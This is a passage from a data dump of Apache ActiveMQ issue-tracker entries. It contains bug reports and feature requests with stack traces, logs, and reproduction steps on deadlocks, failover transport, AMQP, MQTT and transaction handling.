tcp:///10.40.50.17:4484@61616" daemon prio=10 tid=0x00007f8fa8039800 nid=0x2ed2 waiting on condition [0x00007f8f1f2e0000][01:08:01]    java.lang.Thread.State: WAITING (parking)[01:08:01]         at sun.misc.Unsafe.park(Native Method)[01:08:01]         - parking to wait for  <0x00007f90530ed8d8> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync)[01:08:01]         at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156)[01:08:01]         at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)[01:08:01]         at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireShared(AbstractQueuedSynchronizer.java:941)[01:08:01]         at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireShared(AbstractQueuedSynchronizer.java:1261)[01:08:01]         at java.util.concurrent.locks.ReentrantReadWriteLock$ReadLock.lock(ReentrantReadWriteLock.java:594)[01:08:01]         at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:972)[01:08:01]         at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:958)[01:08:01]         at org.apache.activemq.store.kahadb.KahaDBTransactionStore.rollback(KahaDBTransactionStore.java:312)[01:08:01]         at org.apache.activemq.transaction.LocalTransaction.rollback(LocalTransaction.java:94)[01:08:01]         - locked <0x00007f90500034e0> (a org.apache.activemq.store.kahadb.KahaDBTransactionStore)[01:08:01]         at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:74)[01:08:01]         at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:253)[01:08:01]         at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:112)[01:08:01]         at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:453)[01:08:01]         at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)[01:08:01]         at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294)[01:08:01]         at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:148)[01:08:01]         at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)[01:08:01]         at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)[01:08:01]         at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)[01:08:01]         at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)[01:08:01]         at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)[01:08:01]         at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)[01:08:01]         at java.lang.Thread.run(Thread.java:662)At last we find 0x00007f90530ed8d8 is in many write lock waiting.But none write lock hodes it. The dead lock occurs.[01:07:56] "ActiveMQ Transport: tcp:///10.40.50.47:60701@61616" daemon prio=10 tid=0x00007f8f7cbc5000 nid=0x3ec8 waiting on condition [0x00007f900d864000][01:07:56]    java.lang.Thread.State: WAITING (parking)[01:07:56]         at sun.misc.Unsafe.park(Native Method)[01:07:56]         - parking to wait for  <0x00007f90530ed8d8> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync)[01:07:56]         at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156)[01:07:56]         at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)[01:07:56]         at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireShared(AbstractQueuedSynchronizer.java:941)[01:07:56]         at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireShared(AbstractQueuedSynchronizer.java:1261)[01:07:56]         at java.util.concurrent.locks.ReentrantReadWriteLock$ReadLock.lock(ReentrantReadWriteLock.java:594)[01:07:56]         at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:972)[01:07:56]         at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:958)[01:07:56]         at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeMessage(KahaDBStore.java:453)[01:07:56]         at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeAsyncMessage(KahaDBStore.java:407)[01:07:56]         at org.apache.activemq.store.kahadb.KahaDBTransactionStore.removeAsyncMessage(KahaDBTransactionStore.java:498)[01:07:56]         at org.apache.activemq.store.kahadb.KahaDBTransactionStore$1.removeAsyncMessage(KahaDBTransactionStore.java:185)[01:07:56]         at org.apache.activemq.broker.region.Queue.acknowledge(Queue.java:998)[01:07:56]         at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1781)[01:07:56]         at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:63)[01:07:56]         at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:235)[01:07:56]         - locked <0x00007f905d10b1e8> (a java.lang.Object)[01:07:56]         at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:446)[01:07:56]         at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:461)[01:07:56]         at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:82)[01:07:56]         at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:277)[01:07:56]         at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:92)[01:07:56]         at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:505)[01:07:56]         at org.apache.activemq.command.MessageAck.visit(MessageAck.java:245)[01:07:56]         at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294)[01:07:56]         at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:148)[01:07:56]         at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)[01:07:56]         at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)[01:07:56]         at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)[01:07:56]         at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)[01:07:56]         at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)[01:07:56]         at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)[01:07:56]         at java.lang.Thread.run(Thread.java:662)In my opinion, IOExceptions may lead to losing persisten messages and so on ,but the broker shouldn"t stop service.
issueID:AMQ-5816
type:Bug
changed files:
texts:NPE during sending a message when using http transport and leveldb store
It is impossible to use combination of HTTP transport with LevelDB as persistent store: when trying to send a persistent message the broker throws a NullPointerException (see attachment Exception).This happens because HTTP transport uses XStream library for deserealization, which follows Java Serialization rules. As a result, transient field dataLocator is null after deserialization. Later, LevelDB invokes getDataLocator, and that"s when NPE is thrown.Proposed patch adds private method readResolve, which is invoked after deserialization, and which initializes dataLocator field.
issueID:AMQ-5819
type:Bug
changed files:FailoverTransport.java
texts:Failover Transport - Sleep for Reconnect Delay happens twice per iteration
When the failover transport is attempting to reconnect, it appears to sleep two different times, resulting in more than the expected reconnect delay.To reproduce: start a jms client with brokerUrl: failover:(tcp://hostname:61616)?randomize=false&warnAfterReconnectAttempts=1 turn on debug logging for logger "org.apache.activemq.transport.failover.FailoverTransport" Once the application has connected, stop the broker on hostnameWhile the broker is down, observe the logs from org.apache.activemq.transport.failover.FailoverTransport, and you will see the following pattern for each iteration:=====================WARN - Failed to connect to &#91;tcp://hostname:61616&#93; after: n attempt(s) continuing to retry.DEBUG - Waiting <reconnectDelay> ms before attempting connection&#8211; sleep happens hereDEBUG - urlList connectionList:&#91;tcp://hostname:61616&#93;, from: &#91;tcp://hostname:61616&#93;DEBUG - Waiting <reconnectDelay> ms before attempting connection&#8212; sleep happens hereDEBUG - Attempting  nth  connect to: tcp://hostname:61616DEBUG - Connect fail to: tcp://hostname:61616, reason: java.net.ConnectException: Connection refused: connect=====================The above sequence is repeated for as long as the broker is down, with the exponent applied to the reconnectDelay in between the above two instances of sleep. In the configuration above, once the maxReconnectDelay is reached (30 seconds) it is actually 1 minute between attempts to reconnect to the broker. Log output with timestamps is shown below, and you can see that it is 1 minute between attempting the 13th connection and attempting to 14th connection, even though maxReconnectDelay is 30 seconds:log4j.appender.CONSOLE.layout.ConversionPattern=%d &#91;%C:%-4L&#93; %-5p - %m%n=====================2015-06-02 10:39:19,824 &#91;org.apache.activemq.transport.failover.FailoverTransport:1024&#93; DEBUG - Attempting  13th  connect to: tcp://hostname:616162015-06-02 10:39:20,860 &#91;org.apache.activemq.transport.failover.FailoverTransport:1075&#93; DEBUG - Connect fail to: tcp://hostname:61616, reason: java.net.ConnectException: Connection refused: connect2015-06-02 10:39:20,860 &#91;org.apache.activemq.transport.failover.FailoverTransport:1119&#93; WARN  - Failed to connect to &#91;tcp://hostname:61616&#93; after: 14 attempt(s) continuing to retry.2015-06-02 10:39:20,860 &#91;org.apache.activemq.transport.failover.FailoverTransport:1135&#93; DEBUG - Waiting 30000 ms before attempting connection2015-06-02 10:39:50,868 &#91;org.apache.activemq.transport.failover.FailoverTransport:814 &#93; DEBUG - urlList connectionList:&#91;tcp://hostname:61616&#93;, from: &#91;tcp://hostname:61616&#93;2015-06-02 10:39:50,868 &#91;org.apache.activemq.transport.failover.FailoverTransport:1000&#93; DEBUG - Waiting 30000 ms before attempting connection.2015-06-02 10:40:20,870 &#91;org.apache.activemq.transport.failover.FailoverTransport:1024&#93; DEBUG - Attempting  14th  connect to: tcp://hostname:61616=====================
issueID:AMQ-582
type:Improvement
changed files:
texts:Maven2 build improvements
None
issueID:AMQ-5821
type:Bug
changed files:Activator.java
texts:Activator can trigger unwanted behaviour when loading classes from other bundles
Currently org.apache.activemq.util.osgi.Activator watches all other bundles and tries to load some classes using their classloader to check if they might implement extensions. This can go wrong if the bundle uses dynamic imports like e.g. jline does. In this case the jline bundle is triggered to load classes from ActiveMQ. This establishes a wiring from jline to ActiveMQ. If the ActiveMQ bundle are now refreshed or uninstalled jline also has to be refreshed which triggers refreshs of a lot more bundles.I propose to replace the class probing with checking of the bundle requirements. We simply check if the bundle has an import for the packages of the interface classes of ActiveMQ. So we avoid triggering classloading and the creation of unwanted wirings.
issueID:AMQ-5822
type:Bug
changed files:
texts:NIO Transport for OpenWire doesn&#39;t track bytes read
The NIO Transport used for OpenWire connections does not track the bytes read in the Transport"s receiveCounter which can lead to incorrectly flagged inactive connections over slow links or with large messages.
issueID:AMQ-5828
type:Bug
changed files:
texts:AMQP: Messages default to Durable
Running SNAPSHOT-2015-602If the broker receives a message with no header or with an empty header then the message is accepted as Durable. If the message has a header in which Durable=false then the message is accepted as Non-Durable.The default for Amqp 1.0 is durable=false.
issueID:AMQ-583
type:Test
changed files:
texts:DiscoveryTransportBrokerTest can fail on some platforms
e.g. on our CI test rig it works on aladdin but fils on iago, jafa, spinach.Could this be an envrionment thing? (other processes running on the box or something - multicast not properly supported etc?) Or is it just something to do with the test case?
issueID:AMQ-5830
type:Bug
changed files:
texts:Broker duplex network connection is shutdown when "javax.jms.ResourceAllocationException: Usage Manager memory limit" is sent across the network
With "sendFailIfNoSpaceAfterTimeout" or "sendFailIfNoSpace" is configured, producer flow control will send a javax.jms.ResourceAllocationException. This message is not supposed to be sent across the broker network.In a duplex network connection, the javax.jms.ResourceAllocationException is being sent across the network. This exception is received by the peer broker and the peer broker will subsequently shutdown the network connection.Note: it only seems to happen if the javax.jms.ResourceAllocationException is thrown from the broker that has the duplex network connector configured.Potential workaround: use non duplex network connectors ( one defined on each peer broker)
issueID:AMQ-5831
type:Improvement
changed files:
texts:Revisit topic statistics
Currently, topic statistics can be confusing especially if you"re using wildcard subscribers. In that case, inflight count and dequeue count is never updated when message is acked, so users can think that messages are not consumed.Statistics are primarily developed for queues and then adapted for topics, which is why is some of them doesn"t make sense in this use case.To me, it"d make sense to keep only enqueue/dequeue properties on the topic, so that we can see general behaviour of the topic. Then every consumer, should keep it"s own enqueue, dequeue, inflight (enqueue-dequeue) counts.
issueID:AMQ-5834
type:Bug
changed files:
texts:MQTT: Publish when not authorized can stall due to missing server ACK.
An MQTT client can freeze during publishing when the client is not logged in with credentials necessary to write to the target destination.Both MQTT 3.1 specification and the updated 3.1.1 specification stipulate that the broker should reply with a positive acknowledgement even if the client has no rights to publish on a topic.   v3.1 Updated specification for PUBLISHMQTT 3.1 ( http://public.dhe.ibm.com/software/dw/webservices/ws-mqtt/mqtt-v3r1.html#publish )"...Note that if a server implementation does not authorize a PUBLISH to be made by a client, it has no way of informing that client. It must therefore make a positive acknowledgement, according to the normal QoS rules, and the client will not be informed that it was not authorized to publish the message...."And v3.1.1 Updated specification for PUBLISHMQTT 3.1.1 ( http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718037 )"...If a Server implementation does not authorize a PUBLISH to be performed by a Client; it has no way of informing that Client. It MUST either make a positive acknowledgement, according to the normal QoS rules, or close the Network Connection &#91;MQTT-3.3.5-2&#93;...."In v3.1.1 we would be allowed to close the connection but given that there is no indication to the client as to why it lost its connection it would most likely just reconnect and continue on.We can log a warning on each failed PUBLISH due to security constraints to make it easier to debug missing messages.
issueID:AMQ-5836
type:Improvement
changed files:
texts:http://activemq.apache.org/jmx.html out of date
http://activemq.apache.org/jmx.html refers to setting SUNJMX env variable.However, I had to set ACTIVEMQ_SUNJMX_START to make JMX work.
issueID:AMQ-5837
type:New Feature
changed files:
texts:Add inflight message size to SubscriptionStatistics
It would be useful to know the total message size of messages that are inflight (besides just the count) on a Subscription for monitoring and metrics purposes.  This value can be added to SubscriptionStatistics and kept in up to date so it can be displayed without blocking.A future enhancement when AMQ-5748 is done could be to add a pending message statistics.  AMQ-5748 is required first to be able to recover message sizes across a broker restart.
issueID:AMQ-5839
type:Bug
changed files:
texts:AMQP: NoLocal Filter Name is wrong
The name used for the AMQP NoLocal filter value is wrong and maps to the selector string leading to incorrectly enabling noLocal for consumers that set a selector using the name in the filter described value.
issueID:AMQ-5841
type:Bug
changed files:Main.java
activemq
ShellCommand.java
texts:activemq script returns a non zero exit code for successful operations
By default operations return 1 when broker is not running. That"s not necessary for many script operations like create, encrypt, etc. We should always rely on what the actual task returns.
issueID:AMQ-5843
type:New Feature
changed files:
texts:Add an option to include original message body for advisory messages
Currently some advisory messages such as messageConsumed or messageDelivered advisories contain a copy of the original message set as the dataStructure, but the message body is missing because it has been cleared out.This is fine most of the time but it would be nice to be have the ability to optionally include the original message body of messages.  This should be off by default because of the performance hit, but sometimes I want to have the option to receive  the message body content (ie the entire message) on the advisory topic for auditing purposes.
issueID:AMQ-5844
type:Bug
changed files:
texts:Introduce logic into the failover transport not to recreate "aborted" slow consumers.
AbortSlowConsumerStrategy can forcefully abort a slow consumer on the broker side if the consumer (client side) is not responding to the request to gracefully shutdown.If the connection between broker and consumer is subsequently lost, the failover transport recreates the connection and transparently re-registers all consumers on the broker side including those slow consumers that were previously forcefully aborted. It would be good to introduce some logic into the failover transport to avoid recreating slow consumers that have already been "forcefully" aborted on broker.
issueID:AMQ-5845
type:Improvement
changed files:
texts:AMQP: Include broker version information in the Connection properties
Similar to our STOMP transport we should return broker version information in the connection properties sent to the remote peer on connect. For new we can use the Symbol values: producer, version and platform
issueID:AMQ-5847
type:New Feature
changed files:
texts:AMQP: Support transactions that span multiple session for a single TXN
For some clients the ability to have a single TXN that spans multiple sessions is desired so that the TX Coordinator link can be opened in its own session and still allow for links in other sessions to send and receive inside the TX that the coordinator has declared.  At the moment if a client does this it will appear to work in some cases but can leak some memory and any transacted sends from a session not associated with the coordinator link will not be rolled back a redelivered correctly.
issueID:AMQ-5848
type:Bug
changed files:
texts:The noLocal state for a durable subscription is not stored and recovered.
The broker does not store the noLocal value as part of the SubscriptionInfo object that represents stored durable subscriptions.  This means that on restart the value for previous subscriptions is not recovered from the store which means we can fail tests for this bit in the JMS spec:If an unshared durable subscription already exists with the same name and client identifier but a different topic, message selector or noLocal value has been specified, and there is no consumer already active (i.e. not closed) on the durable subscription then this is equivalent to unsubscribing (deleting) the old one and creating a new one. This also means that an AMQP receiver that tries to recover a previous durable subscription won"t be able to validate the remote Source to validate that its state matches the requested subscription configuration.
issueID:AMQ-585
type:Bug
changed files:
texts:InstanceAlreadyExistsException on .war redeploy (if useJmx="true)
I am using ActiveMQ as part of a web-app deployed to Tomcat. Active MQ is configured via spring and follows the spring examples that you ship with the source in M4. If I configure the broker to use JMX (  <broker useJmx="true"> ) and deploy the app to tomcat, everything goes fine. However, when I deploy a newer version of the app (hot deploy) I get the following error when the JMS consumer is created from spring:006-02-20 15:16:17,378 ERROR org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:205) Context initialization failedorg.springframework.beans.factory.BeanCreationException: Error creating bean with name "smsResponseConsumer" defined in ServletContext resource &#91;/WEB-INF/applicationContext-messaging.xml&#93;: Initialization of bean failed; nested exception is javax.jms.JMSException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhostjavax.jms.JMSException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhostAnd the root cause of this exception is:Caused by: javax.management.InstanceAlreadyExistsException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhost at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27) at java.lang.reflect.Constructor.newInstance(Constructor.java:274) at org.apache.activemq.openwire.DataStreamMarshaller.createThrowable(DataStreamMarshaller.java:199) at org.apache.activemq.openwire.DataStreamMarshaller.unmarsalThrowable(DataStreamMarshaller.java:159) at org.apache.activemq.openwire.v1.ExceptionResponseMarshaller.unmarshal(ExceptionResponseMarshaller.java:67) at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:214) at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:181) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135) ... 1 moreSo it appears as if the JMX entry isn"t "unbound" when the applicaiton restarts on a redeploy.If I set JMX to false then I can redeploy the application without any errors.
issueID:AMQ-5850
type:Improvement
changed files:AmqpWireFormat.java
texts:AMQP: Broker should use &#39;JMS&#39; transformer by default
Currently the AMQP transportConnector uses the "NATIVE" transformer by default which limits the interoperability of AMQP client"s and client"s using other protocols as the messages they"d receive sent from any AMQP connection would be a BytesMessage with the unconverted AMQP message as the payload.By using the JMS transformer as the default we allow AMQP to interoperate just like all the other client connectors attempt to do.  Issues that existed previously with the JMS transformer have been pretty well ironed out now and most all AMQP features work even when using this transformer. Those wishing to gain the small bit of performance that using native transformation would give and who don"t require the interop between protocols can configure their transportConnector to use the NATIVE transformer via "transport.transformer=NATIVE"
issueID:AMQ-5851
type:Bug
changed files:
texts:Unmatched acknowledge: MessageAck {commandId = 77, responseRequired = false, ackType = 2, ...Could not find Message-ID XXX in dispatched-list (start of ack)
When lot of messages got expired because of JMS client Time to Live (TTL) property then below error will appear and consumer will freeze Connection to broker failed: Unmatched acknowledge: MessageAck {commandId = 77, responseRequired = false, ackType = 2, consumerId =XXX firstMessageId = ID:XXX lastMessageId = ID:XXX, destination = queue://abc, transactionId = null, messageCount = 1, poisonCause = null}; Could not find Message-ID in dispatched-list (start of ack)         at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:477) [activemq-broker-5.11.1.jar:5.11.1 at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:212) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:441) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:484) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:87) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:87) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:277) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:97) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:550) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.command.MessageAck.visit(MessageAck.java:245) [activemq-client-5.11.1.jar:5.11.1] at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188) [activemq-broker-5.11.1.jar:5.11.1] at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) [activemq-client-5.11.1.jar:5.11.1] at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) [activemq-client-5.11.1.jar:5.11.1] at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) [activemq-client-5.11.1.jar:5.11.1] at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) [activemq-client-5.11.1.jar:5.11.1] at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) [activemq-client-5.11.1.jar:5.11.1] at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) [activemq-client-5.11.1.jar:5.11.1] at java.lang.Thread.run(Thread.java:745) [rt.jar:1.8.0_25]Steps to reproduce :1. Enable TTL property for JMS client2. Keep TTL value very low say 5 sec3. Send lot of messages so some message will get expired4. Make sure that some message should expired when they are in MDB means running inside MDBThen we will see above error in the logs
issueID:AMQ-5853
type:Bug
changed files:
texts:JDBC store - pending high priority messages batch cannot be consumed after low priority message batch
With priority message enabled a batch of low priority messages can leave the cursor unable to load subsequent high priority messages.More visible when useCache=false.A new consumer or browse will not be able to see pending messages.Issue occurs after dispatch of low priority messages, an empty store and the addition of high priority messages.
issueID:AMQ-5854
type:Bug
changed files:
texts:Duplicate messages when failover is done during prepare phase of two phase commit.
Use case :                With Spring DMLC, Read a jms message in a queue, produce a jms message in an output queue and write data in database.Problem description :                Due to hight CPU usage, the inactity monitor closes connections between clients and broker while 16 messages were processed.2015-06-01 04:39:01,130 | WARN  | Transport Connection to: tcp://*** failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>30000) long: tcp://*** | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ InactivityMonitor Worker                15 messages are rolled back and redilevered to another consummer.                In the log we got 15 warnings :ActiveMQMessageConsumer   |WARN |jmsContainer-173|rolling back transaction (XID:***) post failover recovery. 1 previously delivered message(s) not replayed to consumer: ***                But one message is not rolled back (the transaction commit) and is also redileverd to another consummer. So it"s processed twice by two different consummers (two inserts in database and two output JMS messages generated) and is not deduplicated.                In the activeMq log we got the message :WARN  | Async error occurred:  | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///***                       javax.jms.JMSException: Unmatched acknowledge: MessageAck {commandId = 6665, responseRequired = false, ackType = 2, consumerId = ID:***, firstMessageId = ID:***-50800-1433109620591-1:2:31356:1:1, lastMessageId = ID:***-50800-1433109620591-1:2:31356:1:1, destination = queue://***, transactionId = XID:[1096044365,globalId=47524f55505f3030303038736572766963657472616974656d656e7431363536373030343133,branchId=47524f55505f3030303038736572766963657472616974656d656e743137343737], messageCount = 1, poisonCause = null}; Could not find Message-ID ID:***-50800-1433109620591-1:2:31356:1:1 in dispatched-list (start of ack)                For this duplicated message, the failover occur during prepare phase of commit :[{2015/06/01 04:39:50,322 |FailoverTransport         |WARN |jmsContainer-152|Transport (tcp://***) failed, reason:  , attempting to automatically reconnect}]org.apache.activemq.transport.InactivityIOException: Cannot send, channel has already failed: ***                at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:297)                at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:286)                at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)                at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)                at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:658)                at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)                at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)                at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1321)                at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1315)                at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1933)                at org.apache.activemq.ActiveMQSession.sendAck(ActiveMQSession.java:2099)                at org.apache.activemq.ActiveMQSession.sendAck(ActiveMQSession.java:2094)                at org.apache.activemq.ActiveMQMessageConsumer.acknowledge(ActiveMQMessageConsumer.java:1083)                at org.apache.activemq.ActiveMQMessageConsumer$5.beforeEnd(ActiveMQMessageConsumer.java:1041)                at org.apache.activemq.TransactionContext.beforeEnd(TransactionContext.java:202)                at org.apache.activemq.TransactionContext.end(TransactionContext.java:409)                at com.atomikos.datasource.xa.XAResourceTransaction.suspend(XAResourceTransaction.java:457)                at com.atomikos.datasource.xa.XAResourceTransaction.prepare(XAResourceTransaction.java:608)                at com.atomikos.icatch.imp.PrepareMessage.send(PrepareMessage.java:61)                at com.atomikos.icatch.imp.PropagationMessage.submit(PropagationMessage.java:111)                at com.atomikos.icatch.imp.Propagator$PropagatorThread.run(Propagator.java:87)                at com.atomikos.icatch.imp.Propagator.submitPropagationMessage(Propagator.java:66)                at com.atomikos.icatch.imp.ActiveStateHandler.prepare(ActiveStateHandler.java:173)                at com.atomikos.icatch.imp.CoordinatorImp.prepare(CoordinatorImp.java:832)                at com.atomikos.icatch.imp.CoordinatorImp.terminate(CoordinatorImp.java:1159)                at com.atomikos.icatch.imp.CompositeTerminatorImp.commit(CompositeTerminatorImp.java:92)                at com.atomikos.icatch.jta.TransactionImp.commit(TransactionImp.java:236)                at com.atomikos.icatch.jta.TransactionManagerImp.commit(TransactionManagerImp.java:498)                at com.atomikos.icatch.jta.UserTransactionImp.commit(UserTransactionImp.java:129)                at org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1011)                at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:755)                at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:724)                at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:257)                at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1101)                at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:995)                at java.lang.Thread.run(Thread.java:761)Our analysis :                We think that the duplicate message is caused by the failover during the prepare phase of the commit so we modify the source code to reproduce the case.                Our modifications in config to produce failovers:                               broker : transport.useKeepAlive=false                               client : wireFormat.maxInactivityDuration=5000                We add Thread.sleep in the source code of org.apache.activemq.ActiveMQMessageConsumer to force failover to be done exactly where we think it causes problems :org.apache.activemq.ActiveMQMessageConsumer#acknowledge()                                    public void acknowledge() throws JMSException {                               clearDeliveredList();                               waitForRedeliveries();                               synchronized(deliveredMessages) {                                   // BEGIN MODIFIED CODE                                   LOG.warn("start sleeping 20 seconds to test failover");                                   try{                                       Thread.sleep(1000 * 20 );                                   }catch (InterruptedException e){                                       LOG.error("Exception :",e);                                   }                                   LOG.warn("end sleeping 20 seconds to test failover");                                   // END MODIFIED CODE                                   // Acknowledge all messages so far.                                   MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);                                   if (ack == null)                                       return; // no msgs                                   if (session.getTransacted()) {                                       rollbackOnFailedRecoveryRedelivery();                                       session.doStartTransaction();                                       ack.setTransactionId(session.getTransactionContext().getTransactionId());                                   }                                   pendingAck = null;                                    session.sendAck(ack);                                   // Adjust the counters                                   deliveredCounter = Math.max(0, deliveredCounter - deliveredMessages.size());                                   additionalWindowSize = Math.max(0, additionalWindowSize - deliveredMessages.size());                                   if (!session.getTransacted()) {                                       deliveredMessages.clear();                                   }                               }                    }                                               With these changes on the configuration and the code, the problem is easily reproduced.                We also try with transactedIndividualAck=true, and we add a Thread.sleep in the code :org.apache.activemq.ActiveMQMessageConsumer#registerSync()                                    private void registerSync() throws JMSException {                               session.doStartTransaction();                               if (!synchronizationRegistered) {                                   synchronizationRegistered = true;                                   session.getTransactionContext().addSynchronization(new Synchronization() {                                       @Override                                       public void beforeEnd() throws Exception {                                           if (transactedIndividualAck) {                                               clearDeliveredList();                                               waitForRedeliveries();                                               synchronized(deliveredMessages) {                                                                                                      // BEGIN MODIFIED CODE                                                   LOG.warn("start sleeping 20 seconds to test failover");                                                   try{                                                       Thread.sleep(1000 * 20 );                                                   }catch (InterruptedException e){                                                       LOG.error("Exception :",e);                                                   }                                                   LOG.warn("end sleeping 20 seconds to test failover");                                                   // END MODIFIED CODE                                                                               rollbackOnFailedRecoveryRedelivery();                                               }                                           } else {                                               acknowledge();                                           }                                           synchronizationRegistered = false;                                       }                                       @Override                                       public void afterCommit() throws Exception {                                           commit();                                           synchronizationRegistered = false;                                       }                                       @Override                                       public void 